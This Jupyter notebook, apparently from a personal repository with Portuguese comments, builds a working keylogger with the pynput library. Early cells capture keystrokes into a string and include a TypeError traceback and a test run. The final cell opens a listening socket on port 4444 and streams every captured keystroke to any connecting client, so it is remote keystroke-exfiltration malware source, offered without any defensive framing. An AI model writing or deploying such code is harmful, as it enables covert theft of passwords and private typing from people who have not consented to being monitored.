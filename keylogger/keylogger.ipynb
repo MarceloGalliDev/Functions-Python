{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "from socket import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.\n",
      "Unhandled exception in listener callback\n",
      "Traceback (most recent call last):\n",
      "  File \"/Users/marcelogalli/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/__init__.py\", line 228, in inner\n",
      "    return f(self, *args, **kwargs)\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/Users/marcelogalli/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/darwin.py\", line 265, in _handler\n",
      "    self._handle(proxy, event_type, event, refcon)\n",
      "  File \"/Users/marcelogalli/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/keyboard/_darwin.py\", line 269, in _handle\n",
      "    self.on_press(key)\n",
      "  File \"/Users/marcelogalli/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/__init__.py\", line 144, in inner\n",
      "    if f(*args) is False:\n",
      "       ^^^^^^^^\n",
      "  File \"/var/folders/v8/mwd2w9sx4vscpt3ttqlvwws40000gn/T/ipykernel_15510/3079267262.py\", line 9, in on_press\n",
      "    pressed_keys_str += key.char\n",
      "TypeError: can only concatenate str (not \"NoneType\") to str\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "can only concatenate str (not \"NoneType\") to str",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[1;32m/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb Célula 2\u001b[0m line \u001b[0;36m2\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=22'>23</a>\u001b[0m \u001b[39m# Configura e inicia o listener\u001b[39;00m\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=23'>24</a>\u001b[0m \u001b[39mwith\u001b[39;00m Listener(on_press\u001b[39m=\u001b[39mon_press, on_release\u001b[39m=\u001b[39mon_release) \u001b[39mas\u001b[39;00m listener:\n\u001b[0;32m---> <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=24'>25</a>\u001b[0m     listener\u001b[39m.\u001b[39;49mjoin()\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=26'>27</a>\u001b[0m \u001b[39m# Exibe a string resultante\u001b[39;00m\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=27'>28</a>\u001b[0m \u001b[39mprint\u001b[39m(\u001b[39mf\u001b[39m\u001b[39m\"\u001b[39m\u001b[39mTeclas pressionadas: \u001b[39m\u001b[39m{\u001b[39;00mpressed_keys_str\u001b[39m}\u001b[39;00m\u001b[39m\"\u001b[39m)\n",
      "File \u001b[0;32m~/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/__init__.py:276\u001b[0m, in \u001b[0;36mAbstractListener.join\u001b[0;34m(self, *args)\u001b[0m\n\u001b[1;32m    274\u001b[0m \u001b[39mexcept\u001b[39;00m \u001b[39mTypeError\u001b[39;00m:\n\u001b[1;32m    275\u001b[0m     \u001b[39mreturn\u001b[39;00m\n\u001b[0;32m--> 276\u001b[0m six\u001b[39m.\u001b[39;49mreraise(exc_type, exc_value, exc_traceback)\n",
      "File \u001b[0;32m~/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/six.py:718\u001b[0m, in \u001b[0;36mreraise\u001b[0;34m(tp, value, tb)\u001b[0m\n\u001b[1;32m    716\u001b[0m         value \u001b[39m=\u001b[39m tp()\n\u001b[1;32m    717\u001b[0m     \u001b[39mif\u001b[39;00m value\u001b[39m.\u001b[39m__traceback__ \u001b[39mis\u001b[39;00m \u001b[39mnot\u001b[39;00m tb:\n\u001b[0;32m--> 718\u001b[0m         \u001b[39mraise\u001b[39;00m value\u001b[39m.\u001b[39mwith_traceback(tb)\n\u001b[1;32m    719\u001b[0m     \u001b[39mraise\u001b[39;00m value\n\u001b[1;32m    720\u001b[0m \u001b[39mfinally\u001b[39;00m:\n",
      "File \u001b[0;32m~/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/__init__.py:228\u001b[0m, in \u001b[0;36mAbstractListener._emitter.<locals>.inner\u001b[0;34m(self, *args, **kwargs)\u001b[0m\n\u001b[1;32m    224\u001b[0m \u001b[39m@functools\u001b[39m\u001b[39m.\u001b[39mwraps(f)\n\u001b[1;32m    225\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39minner\u001b[39m(\u001b[39mself\u001b[39m, \u001b[39m*\u001b[39margs, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39mkwargs):\n\u001b[1;32m    226\u001b[0m     \u001b[39m# pylint: disable=W0702; we want to catch all exception\u001b[39;00m\n\u001b[1;32m    227\u001b[0m     \u001b[39mtry\u001b[39;00m:\n\u001b[0;32m--> 228\u001b[0m         \u001b[39mreturn\u001b[39;00m f(\u001b[39mself\u001b[39;49m, \u001b[39m*\u001b[39;49margs, \u001b[39m*\u001b[39;49m\u001b[39m*\u001b[39;49mkwargs)\n\u001b[1;32m    229\u001b[0m     \u001b[39mexcept\u001b[39;00m \u001b[39mException\u001b[39;00m \u001b[39mas\u001b[39;00m e:\n\u001b[1;32m    230\u001b[0m         \u001b[39mif\u001b[39;00m \u001b[39mnot\u001b[39;00m \u001b[39misinstance\u001b[39m(e, \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_HANDLED_EXCEPTIONS):\n",
      "File \u001b[0;32m~/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/darwin.py:265\u001b[0m, in \u001b[0;36mListenerMixin._handler\u001b[0;34m(self, proxy, event_type, event, refcon)\u001b[0m\n\u001b[1;32m    259\u001b[0m \u001b[39m@AbstractListener\u001b[39m\u001b[39m.\u001b[39m_emitter\n\u001b[1;32m    260\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39m_handler\u001b[39m(\u001b[39mself\u001b[39m, proxy, event_type, event, refcon):\n\u001b[1;32m    261\u001b[0m \u001b[39m    \u001b[39m\u001b[39m\"\"\"The callback registered with *macOS* for mouse events.\u001b[39;00m\n\u001b[1;32m    262\u001b[0m \n\u001b[1;32m    263\u001b[0m \u001b[39m    This method will call the callbacks registered on initialisation.\u001b[39;00m\n\u001b[1;32m    264\u001b[0m \u001b[39m    \"\"\"\u001b[39;00m\n\u001b[0;32m--> 265\u001b[0m     \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49m_handle(proxy, event_type, event, refcon)\n\u001b[1;32m    266\u001b[0m     \u001b[39mif\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_intercept \u001b[39mis\u001b[39;00m \u001b[39mnot\u001b[39;00m \u001b[39mNone\u001b[39;00m:\n\u001b[1;32m    267\u001b[0m         \u001b[39mreturn\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39m_intercept(event_type, event)\n",
      "File \u001b[0;32m~/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/keyboard/_darwin.py:269\u001b[0m, in \u001b[0;36mListener._handle\u001b[0;34m(self, _proxy, event_type, event, _refcon)\u001b[0m\n\u001b[1;32m    266\u001b[0m \u001b[39mtry\u001b[39;00m:\n\u001b[1;32m    267\u001b[0m     \u001b[39mif\u001b[39;00m event_type \u001b[39m==\u001b[39m Quartz\u001b[39m.\u001b[39mkCGEventKeyDown:\n\u001b[1;32m    268\u001b[0m         \u001b[39m# This is a normal key press\u001b[39;00m\n\u001b[0;32m--> 269\u001b[0m         \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mon_press(key)\n\u001b[1;32m    271\u001b[0m     \u001b[39melif\u001b[39;00m event_type \u001b[39m==\u001b[39m Quartz\u001b[39m.\u001b[39mkCGEventKeyUp:\n\u001b[1;32m    272\u001b[0m         \u001b[39m# This is a normal key release\u001b[39;00m\n\u001b[1;32m    273\u001b[0m         \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mon_release(key)\n",
      "File \u001b[0;32m~/Documents/GitHub/Functions-Python/.venv/lib/python3.11/site-packages/pynput/_util/__init__.py:144\u001b[0m, in \u001b[0;36mAbstractListener.__init__.<locals>.wrapper.<locals>.inner\u001b[0;34m(*args)\u001b[0m\n\u001b[1;32m    143\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39minner\u001b[39m(\u001b[39m*\u001b[39margs):\n\u001b[0;32m--> 144\u001b[0m     \u001b[39mif\u001b[39;00m f(\u001b[39m*\u001b[39;49margs) \u001b[39mis\u001b[39;00m \u001b[39mFalse\u001b[39;00m:\n\u001b[1;32m    145\u001b[0m         \u001b[39mraise\u001b[39;00m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mStopException()\n",
      "\u001b[1;32m/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb Célula 2\u001b[0m line \u001b[0;36m9\n\u001b[1;32m      <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=5'>6</a>\u001b[0m \u001b[39mglobal\u001b[39;00m pressed_keys_str\n\u001b[1;32m      <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=6'>7</a>\u001b[0m \u001b[39mtry\u001b[39;00m:\n\u001b[1;32m      <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=7'>8</a>\u001b[0m     \u001b[39m# Adiciona a representação de caractere da tecla à string\u001b[39;00m\n\u001b[0;32m----> <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=8'>9</a>\u001b[0m     pressed_keys_str \u001b[39m+\u001b[39;49m\u001b[39m=\u001b[39;49m key\u001b[39m.\u001b[39;49mchar\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=9'>10</a>\u001b[0m \u001b[39mexcept\u001b[39;00m \u001b[39mAttributeError\u001b[39;00m:\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=10'>11</a>\u001b[0m     \u001b[39m# Para teclas especiais, como espaço, você pode escolher uma representação\u001b[39;00m\n\u001b[1;32m     <a href='vscode-notebook-cell:/Users/marcelogalli/Documents/GitHub/Functions-Python/keylogger/keylogger.ipynb#W1sZmlsZQ%3D%3D?line=11'>12</a>\u001b[0m     \u001b[39mif\u001b[39;00m key \u001b[39m==\u001b[39m Key\u001b[39m.\u001b[39mspace:\n",
      "\u001b[0;31mTypeError\u001b[0m: can only concatenate str (not \"NoneType\") to str"
     ]
    }
   ],
   "source": [
    "list_pressed_keys = []\n",
    "pressed_keys_str = \"\"\n",
    "\n",
    "\n",
    "def on_press(key):\n",
    "    global pressed_keys_str\n",
    "    try:\n",
    "        # Adiciona a representação de caractere da tecla à string\n",
    "        pressed_keys_str += key.char\n",
    "    except AttributeError:\n",
    "        # Para teclas especiais, como espaço, você pode escolher uma representação\n",
    "        if key == Key.space:\n",
    "            pressed_keys_str += ' '\n",
    "\n",
    "    list_pressed_keys.append(pressed_keys_str)\n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False  # Termina o listener quando a tecla 'esc' é pressionada\n",
    "\n",
    "\n",
    "# Configura e inicia o listener\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# Exibe a string resultante\n",
    "print(f\"Teclas pressionadas: {pressed_keys_str}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Teclas pressionadas: teste de captacao de teclado\n"
     ]
    }
   ],
   "source": [
    "list_pressed_keys = []\n",
    "pressed_keys_str = \"\"\n",
    "\n",
    "\n",
    "def on_press(key):\n",
    "    global pressed_keys_str\n",
    "    try:\n",
    "        # Adiciona a representação de caractere da tecla à string\n",
    "        pressed_keys_str += key.char\n",
    "    except AttributeError:\n",
    "        # Para teclas especiais, como espaço, você pode escolher uma representação\n",
    "        if key == Key.space:\n",
    "            pressed_keys_str += ' '\n",
    "\n",
    "    list_pressed_keys.append(pressed_keys_str)\n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False  # Termina o listener quando a tecla 'esc' é pressionada\n",
    "\n",
    "\n",
    "# Configura e inicia o listener\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# Exibe a string resultante\n",
    "print(f\"Teclas pressionadas: {pressed_keys_str}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "teste de captacao de teclado\n"
     ]
    }
   ],
   "source": [
    "print(pressed_keys_str)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "s = socket(AF_INET, SOCK_STREAM)\n",
    "s.bind(('0.0.0.0', 4444))\n",
    "s.listen(2)\n",
    "\n",
    "while True:\n",
    "    obj, addr = s.accept()\n",
    "\n",
    "    def on_press(key):\n",
    "        key = str(key)\n",
    "\n",
    "        if key == \"Key.enter\":\n",
    "            obj.send(b\"\\n\")\n",
    "\n",
    "        elif key == \"Key.space\":\n",
    "            obj.send(b\" \")\n",
    "\n",
    "        else:\n",
    "            obj.send(bytes(key.replace(\"'\", \"\"), \"utf-8\"))\n",
    "\n",
    "    try:\n",
    "        with Listener(on_press) as lis:\n",
    "            lis.join()\n",
    "\n",
    "    except:\n",
    "        obj.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
